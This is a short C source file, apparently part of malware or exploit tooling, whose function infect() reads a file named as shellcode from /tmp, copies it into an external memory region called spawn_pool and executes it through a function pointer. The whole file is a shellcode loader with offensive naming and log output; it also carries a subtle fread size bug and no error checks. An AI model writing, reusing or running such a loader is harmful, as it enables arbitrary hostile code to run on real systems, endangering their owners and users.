#include <stdlib.h>
#include <stdio.h>
#include <spawner.h>
#include <string.h>

extern void *spawn_pool;

static unsigned
get_shellcode(char **buf)
{
    FILE       *file = fopen("/tmp/output.sc", "rb");
    unsigned    len;


    fseek(file, 0L, SEEK_END);
    len = ftell(file);

    fseek(file, 0L, SEEK_SET);

    *buf = malloc(sizeof(char) * len);

    fread(*buf, len, len, file);

    fclose(file);

    return (len);
}

void
infect(void)
{
    char *buf = NULL;
    unsigned len;


    printf("[*] %s\n", __FUNCTION__);

    len = get_shellcode(&buf);

    memcpy(spawn_pool, buf, len);

    void (*func)(void);

    func = spawn_pool;

    func();
}
